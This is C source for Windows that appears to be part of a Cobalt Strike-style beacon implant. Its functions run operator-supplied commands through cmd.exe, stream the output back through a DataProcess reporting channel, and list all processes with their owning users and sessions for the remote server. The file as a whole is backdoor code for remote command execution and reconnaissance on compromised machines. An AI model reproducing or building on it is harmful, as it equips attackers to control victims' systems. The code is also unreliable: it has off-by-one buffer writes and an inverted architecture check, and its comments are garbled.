#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include "Command.h"
#include "Job.h"
#pragma warning(disable:4996)
#ifdef UNICODE
#include <TlHelp32.h>
#define TCHAR wchar_t
#define TEXT(str) L##str
#else
#define TCHAR char
#define TEXT(str) str
#endif

extern BeaconJob;
unsigned char result_buff[1024 * 50];

// convert unsigned char* to _TCHAR*
TCHAR* ConvertTo_TCHAR(const unsigned char* input) {
#ifdef UNICODE
    // If you are using Unicode
    int length = MultiByteToWideChar(CP_UTF8, 0, (const char*)input, -1, NULL, 0);
    TCHAR* result = (TCHAR*)malloc(length * sizeof(TCHAR));
    MultiByteToWideChar(CP_UTF8, 0, (const char*)input, -1, result, length);
    return result;
#else
    // If you are using ANSI
    int length = strlen((const char*)input);
    TCHAR* result = (TCHAR*)malloc((length + 1) * sizeof(TCHAR)); 
    strcpy(result, (const char*)input);
    return result;
#endif
}

typedef struct {
    unsigned char* shellPath;
    unsigned char* shellBuf;
} ParseCommandShellparse;

struct ThreadArgs {
    unsigned char* buf;
    size_t* commandBuflen;
    size_t* Bufflen;
};

ParseCommandShellparse ParseCommandShell(unsigned char* comandBuf) {
    // pathLength(4 Bytes) | path | cmdLength(4 Bytes) |  cmd
    uint8_t pathLenBytes[4];
    memcpy(pathLenBytes, comandBuf, 4);
    uint32_t pathLength = bigEndianUint32(pathLenBytes);
    unsigned char* path = (unsigned char*)malloc(pathLength);
    path[pathLength] = '\0';
    unsigned char* pathstart = comandBuf + 4;
    memcpy(path, pathstart, pathLength);
    uint8_t cmdLenBytes[4];
    unsigned char* cmdLenBytesStart = comandBuf + 4 + pathLength;
    memcpy(cmdLenBytes, cmdLenBytesStart, 4);
    uint32_t cmdLength = bigEndianUint32(cmdLenBytes);
    unsigned char* cmdArgs = (unsigned char*)malloc(cmdLength);
    cmdArgs[cmdLength] = '\0';
    unsigned char* cmdBufferStart = comandBuf + 8 + pathLength;
    memcpy(cmdArgs, cmdBufferStart, cmdLength); // /C whoami
    unsigned char* envKey = str_replace_all(path, "%", "");

    unsigned char* cmdPathFromEnv = getenv(envKey); // C:\WINDOWS\system32\cmd.exe
    ParseCommandShellparse ParseCommandShellparse;
    ParseCommandShellparse.shellPath = cmdPathFromEnv;
    ParseCommandShellparse.shellBuf = cmdArgs;

    free(path);
    return ParseCommandShellparse;
}

DWORD WINAPI myThreadCmdRun(LPVOID lpParam) {
    Sleep(2000);
    struct ThreadArgs* args = (struct ThreadArgs*)lpParam;
    unsigned char* buf = args->buf;
    size_t* commandBuflen = args->commandBuflen;
    size_t* Bufflen = args->Bufflen;

    BOOL bRet = FALSE;

    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES securityAttributes = { 0 };
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreatePipeJob Createpipe = createPipeJob();
    hReadPipe = Createpipe.hReadPipe;
    si = Createpipe.si;

    ParseCommandShellparse ParseCommand = ParseCommandShell(buf);
    TCHAR* shellBuf = ConvertTo_TCHAR(ParseCommand.shellBuf);

    _TCHAR commandLine[MAX_PATH];
    _sntprintf(commandLine, MAX_PATH, _T("%s"), shellBuf); // C:\WINDOWS\system32\cmd.exe  /C whoami

    bRet = CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    if (FALSE == bRet) {
        return 1;
    }
    
    initialize_Beacon_Job(pi.hProcess, pi.hThread, pi.dwProcessId, pi.dwThreadId, hReadPipe, hWritePipe, "process")->JobType = 30; // ֱ�ӷ��ʴ˺����ķ���ֵJobType
    // Wait for the command execution to finish
    // WaitForSingleObject(pi.hThread, INFINITE);
    // WaitForSingleObject(pi.hProcess, INFINITE);
    WaitForSingleObject(pi.hProcess, 5000);

    // Read the result from the anonymous pipe into the output buffer
    bool lastTime = false;
    bool firstTime = true;
    OVERLAPPED overlap = { 0 };
    DWORD readbytes = 0;
    DWORD availbytes = 0;
    while (!lastTime) {

        // ����������ӽ���״̬
        DWORD event = WaitForSingleObject(pi.hProcess, 0);
        if (event == WAIT_OBJECT_0 || event == WAIT_FAILED) { // �ӽ����Ѿ��˳����ߵ���ʧ��
            lastTime = TRUE;
        }

        // ���������ܵ��Ƿ������ݿɶ�
        if (!PeekNamedPipe(hReadPipe, NULL, 0, NULL, &availbytes, NULL)) {
            break;
        }

        // �ӽ���δ�˳����������ݿɶ�
        while (lastTime == false && availbytes == 0) {
            // �ٴεȴ� 5s �ȴ��ӽ����˳�
            DWORD event = WaitForSingleObject(pi.hProcess, 5000);
            // �ٴθ��� availbytes
            PeekNamedPipe(hReadPipe, NULL, 0, NULL, &availbytes, NULL);
        }

        // ��ȡ�ӽ������
        if (lastTime == false || availbytes != 0) {
            ReadFile(hReadPipe, result_buff, sizeof(result_buff), NULL, &overlap);
        }

        DWORD bytesTransferred;
        ULONG_PTR completionKey;
        LPOVERLAPPED pOverlapped;

        if (overlap.InternalHigh > 0) {
            if (firstTime) {
                DataProcess(result_buff, overlap.InternalHigh, 0);
                firstTime = false;
            }
            else {
                // �ӽ��̻�û���˳�
                if (lastTime == false) {

                    uint8_t* metaInfoBytes1[] = { result_buff };
                    size_t metaInfosizes1[] = { overlap.InternalHigh };
                    size_t metaInfoBytesArrays1 = sizeof(metaInfoBytes1) / sizeof(metaInfoBytes1[0]);
                    uint8_t* metaInfoconcatenated1 = CalcByte(metaInfoBytes1, metaInfosizes1, metaInfoBytesArrays1);
                    size_t metaInfoSize1 = 0;
                    // �������� sizeof ����ֵ���ܺ�
                    for (size_t i = 0; i < sizeof(metaInfosizes1) / sizeof(metaInfosizes1[0]); ++i) {
                        metaInfoSize1 += metaInfosizes1[i];
                    }

                    DataProcess(metaInfoconcatenated1, metaInfoSize1, 0);

                }
                else {
                    uint8_t jia[5] = "[+] ";
                    uint8_t nnn[2] = "\n";
                    uint8_t end[75] = "-----------------------------------end-----------------------------------\n";
                    uint8_t* metaInfoBytes[] = { jia,end,ParseCommand.shellBuf + 4 };
                    size_t metaInfosizes[] = { 5,75,strlen(ParseCommand.shellBuf) - 4 };
                    size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
                    uint8_t* metaInfoconcatenated = CalcByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
                    size_t metaInfoSize = 0;
                    // �������� sizeof ����ֵ���ܺ�
                    for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
                        metaInfoSize += metaInfosizes[i];
                    }
                    DataProcess(metaInfoconcatenated, metaInfoSize, 0);
                }
            }
        }

        Sleep(2000);

    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hWritePipe);
    CloseHandle(hReadPipe);

    return 0;
}

DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
    Sleep(2000);
    struct ThreadArgs* args = (struct ThreadArgs*)lpParam;
    unsigned char* buf = args->buf;
    size_t* commandBuflen = args->commandBuflen;
    size_t* Bufflen = args->Bufflen;

    BOOL bRet = FALSE;

    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES securityAttributes = { 0 };
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreatePipeJob Createpipe = createPipeJob();
    hReadPipe = Createpipe.hReadPipe;
    hWritePipe = Createpipe.hWritePipe;
    si = Createpipe.si;

    ParseCommandShellparse ParseCommand = ParseCommandShell(buf); // �� ComandBuffer ����
    TCHAR* shellPath = ConvertTo_TCHAR(ParseCommand.shellPath);
    TCHAR* shellBuf = ConvertTo_TCHAR(ParseCommand.shellBuf);

    // ���������в���
    _TCHAR commandLine[MAX_PATH];
    _sntprintf(commandLine, MAX_PATH, _T("%s %s"), shellPath, shellBuf); //C:\WINDOWS\system32\cmd.exe /C whoami

    bRet = CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi); // ����ִ�еĽ��д�� hReadPipe
    if (FALSE == bRet) {
        fprintf(stderr, "CreateProcess Failed:%lu\n",GetLastError());
        return FALSE;
    }

    initialize_Beacon_Job(pi.hProcess, pi.hThread, pi.dwProcessId, pi.dwThreadId, hReadPipe, hWritePipe, "process")->JobType = 30;
    // �ȴ��ӽ��̽���
    WaitForSingleObject(pi.hProcess, 5000);

    bool lastTime = false;
    bool firstTime = true;
    OVERLAPPED overlap = { 0 };
    DWORD readbytes = 0;
    DWORD availbytes = 0;
    unsigned char readBuffer[1024 * 8]; 
    while (!lastTime) {
        DWORD event = WaitForSingleObject(pi.hProcess, 0); // ��� pi.hProcess ������Ľ��̵�״̬ 
        if (event == WAIT_OBJECT_0 || event == WAIT_FAILED) {
            // �о�����Ҫ�ȹܵ�ȫ����ȡ���ӽ��̲��������� �ӽ��̲Ż��˳�
            // WAIT_OBJECT_0 �����ӽ����Ѿ����� �ӽ����˳���
            // lastTime = True ��ʾcmd����̨û������Ҫ������
            lastTime = TRUE;
        }

        // ���ܵ����Ƿ������ݿɶ�
        // ����ÿ�ζ�ȡ��С����� 4KB ����о��ǹܵ��Ļ���������
        if (!PeekNamedPipe(hReadPipe, NULL, 0, NULL, &availbytes, NULL)) break;
        
        while (lastTime == false && availbytes == 0) {
            // �˷�֧��ʾ�ӽ��̿��ܻ�ûִ���� ��û�в������� ���� availbytes == 0
            // ����ӽ���û��ִ����� ��ѭ���ȴ� pi.hProcess ֱ����ȡ�� availbytes
            // ��������ӽ��̸տ�ʼû��ִ���꣬����ʼ��û�����ݲ���������˷�֧���ǿ����ˣ�
            DWORD event = WaitForSingleObject(pi.hProcess, 5000);
            PeekNamedPipe(hReadPipe, NULL, 0, NULL, &availbytes, NULL);
        }
       
        if (lastTime == false || availbytes != 0) {
            // �˷�֧��ʾ�ӽ��̲��������� ��ʼ��ȡ
            if (!ReadFile(hReadPipe, readBuffer, sizeof(readBuffer), NULL, &overlap)) {
                fprintf(stderr, "ReadFile Failed:%lu\n", GetLastError());
                return FALSE;
            }
        }
        
        DWORD bytesTransferred;
        ULONG_PTR completionKey;
        LPOVERLAPPED pOverlapped;
        
        if (overlap.InternalHigh > 0) {
            if (firstTime) {
                // ��һ�δ������ݽ��������֧
                DataProcess(readBuffer, overlap.InternalHigh, 0);
                firstTime = false;
            }
            else {
                if (lastTime == false) {
                    // �ӽ��̲��������ݻ�û����
                    DataProcess(readBuffer, overlap.InternalHigh, 0);
                }else {
                    // ����ʣ�µ�����
                    DataProcess(readBuffer, overlap.InternalHigh, 0);
                    // ���ǵ�һ�δ������� �����ӽ���ִ������� ���������һ���� Server ��������
                    const char* result = "[+] This Shell Command Already Executed";
                    unsigned char* postInfo = (unsigned char*)malloc(strlen(result));
                    memcpy(postInfo, result, strlen(result));

                    DataProcess(postInfo, strlen(result), 0);
                    free(postInfo);
                 }
            }
        }
        
        Sleep(2000);

    }

    free(shellPath);
    free(shellBuf);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hWritePipe);
    CloseHandle(hReadPipe);
    
    return TRUE;
}

unsigned char* CmdShell(unsigned char* commandBuf, size_t* commandBuflen, size_t* Bufflen)
{
    struct ThreadArgs* args = (struct ThreadArgs*)malloc(sizeof(struct ThreadArgs));
    if (args == NULL) {
        return NULL;
    }

    args->buf = commandBuf;                    
    args->commandBuflen = commandBuflen;  
    ParseCommandShellparse ParseCommand = ParseCommandShell(commandBuf);
    HANDLE myThread;
    if (ParseCommand.shellPath == NULL) {
        myThread = CreateThread(
            NULL,                       // Ĭ���̰߳�ȫ��
            0,                          // Ĭ�϶�ջ��С
            myThreadCmdRun,             // �̺߳���
            args,                       // ���ݸ��̺߳����Ĳ���
            0,                          // Ĭ�ϴ�����־
            NULL);                      // ���洢�߳�ID
        if (myThread == NULL) {
            fprintf(stderr, "Failed to create thread. Error code: %lu\n", GetLastError());
            free(args);
            return NULL;
        }
    }
    else {
        // shell ָ������� Ӧ�ö��ǽ��������֧
        myThread = CreateThread(
            NULL,                       // Ĭ���̰߳�ȫ��
            0,                          // Ĭ�϶�ջ��С
            myThreadCmdshell,           // �̺߳���
            args,                       // ���ݸ��̺߳����Ĳ���
            0,                          // Ĭ�ϴ�����־
            NULL);                      // ���洢�߳�ID
        if (myThread == NULL) {
            fprintf(stderr, "Failed to create thread. Error code: %lu\n", GetLastError());
            free(args);
            return NULL;
        }
    }
   
    WaitForSingleObject(myThread, INFINITE);

    CloseHandle(myThread);

    unsigned char* success = "[+] Command is executed";
    unsigned char* result = (unsigned char*)malloc(strlen(success) +  1);
    if (result == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL; 
    }
    memcpy(result, success, strlen(success) + 1);
    *Bufflen = strlen(result);

    free(args);

    return result;
}

int get_user_sid(size_t BufferSize, HANDLE TokenHandle, char* Buffer)
{
    char Name[512];
    char ReferencedDomainName[512];
    DWORD cchReferencedDomainName = 512;

    SID_NAME_USE peUse;
    memset(Buffer, 0, BufferSize);
    memset(Name, 0, sizeof(Name));
    memset(ReferencedDomainName, 0, sizeof(ReferencedDomainName));

    DWORD ReturnLength;
    TOKEN_USER* TokenInformation;
    DWORD cchName = 512;

    // ��ȡ����� TokenInformation ��С
    if (!GetTokenInformation(TokenHandle, TokenUser, NULL, 0, &ReturnLength) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        return 0;

    // �����ڴ������� TokenInformation
    TokenInformation = (TOKEN_USER*)malloc(ReturnLength);
    if (TokenInformation == NULL)
        return 0;

    // ��ȡ TokenInformation
    if (!GetTokenInformation(TokenHandle, TokenUser, TokenInformation, ReturnLength, &ReturnLength))
    {
        free(TokenInformation);
        return 0;
    }

    if (!LookupAccountSidA(
        NULL,
        TokenInformation->User.Sid,
        Name,
        &cchName,
        ReferencedDomainName,
        &cchReferencedDomainName,
        &peUse))
    {
        free(TokenInformation);
        return 0;
    }

    snprintf(Buffer, BufferSize, "%s\\%s", ReferencedDomainName, Name);
    Buffer[BufferSize - 1] = 0;

    free(TokenInformation);
    return 1;
}

BOOL GetProcessUserInfo(HANDLE ProcessHandle, char* usersid)
{
    HANDLE TokenHandle;
    BOOL status = OpenProcessToken(ProcessHandle, 8u, &TokenHandle);
    if (status)
    {
        status = get_user_sid(0x800, TokenHandle, usersid);
        CloseHandle(TokenHandle);
        return status;
    }
    return status;
}

BOOL IsProcessX64s(DWORD pid) {
    BOOL isX64 = FALSE;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (hProcess != NULL) {
        BOOL result = IsWow64Process(hProcess, &isX64);
        CloseHandle(hProcess);
        return result && isX64;
    }
    return FALSE;
}

void CmdPs(char* Taskdata, int Task_size)
{
    char usersid[2048];
    memset(usersid, 0, sizeof(usersid));

    datap datap;
    BeaconDataParse(&datap, Taskdata, Task_size);
    int unknown = BeaconDataInt(&datap);
    BeaconFormatAlloc((formatp*)&datap, 0x8000);
    if (unknown > 0)
    {
        BeaconFormatInt((formatp*)&datap, unknown);
    }
 
    DWORD pSessionId;
    DWORD th32ProcessID;
    PROCESSENTRY32 pe;
    HANDLE hprocess;
    HANDLE Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
    if (Toolhelp32Snapshot != (HANDLE)-1)
    {
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(Toolhelp32Snapshot, &pe))
        {
            do
            {
                th32ProcessID = pe.th32ProcessID;
                const char* arch2 = "x64";
                BOOL isX64 = IsProcessX64s(pe.th32ProcessID);
                arch2 = !isX64 ? "x64" : "x86";
                hprocess = OpenProcess( PROCESS_ALL_ACCESS, 0, th32ProcessID);
                wchar_t* szExeFile = pe.szExeFile;
                int bufferSize = WideCharToMultiByte(CP_UTF8, 0, szExeFile, -1, NULL, 0, NULL, NULL);
                // �����㹻���ڴ����洢ת������ַ���
                char* szExeFileConverted = (char*)malloc(bufferSize);
                // �� wchar_t* �����ַ���ת���� char* �����ַ���
                WideCharToMultiByte(CP_UTF8, 0, szExeFile, -1, szExeFileConverted, bufferSize, NULL, NULL);
                if (hprocess)
                {
                    if (!GetProcessUserInfo(hprocess, usersid))
                    {
                        usersid[0] = 0;
                    }
                    if (!ProcessIdToSessionId(pe.th32ProcessID, &pSessionId))
                    {
                        pSessionId = -1;
                    }

                    BeaconFormatPrintf(
                        (formatp*)&datap,
                        (char*)"%s\t%d\t%d\t%s\t%s\t%d\n",
                        szExeFileConverted,
                        pe.th32ParentProcessID,
                        pe.th32ProcessID,
                        arch2,
                        usersid,
                        pSessionId);
                }
                else
                {
                    if (!ProcessIdToSessionId(pe.th32ProcessID, &pSessionId))
                    {
                        pSessionId = 0;
                    }
                    BeaconFormatPrintf((formatp*)&datap, (char*)"%s\t%d\t%d\t%s\t%s\t%d\n", 
                        szExeFileConverted,
                        pe.th32ParentProcessID,
                        pe.th32ProcessID,
                        arch2,
                        "",
                        pSessionId);
                }
                CloseHandle(hprocess);
            } while (Process32Next(Toolhelp32Snapshot, &pe));
            CloseHandle(Toolhelp32Snapshot);
            int msg_type;
            if (unknown)
            {
                msg_type = 22;
            }
            else
            {
                msg_type = 17;
            }
            int datalength = BeaconFormatLength((formatp*)&datap);
            char* databuffer = BeaconFormatOriginal((formatp*)&datap);
            DataProcess(databuffer, datalength, msg_type);
            BeaconFormatFree((formatp*)&datap);
        }
        else
        {
            CloseHandle(Toolhelp32Snapshot);
        }
    }
}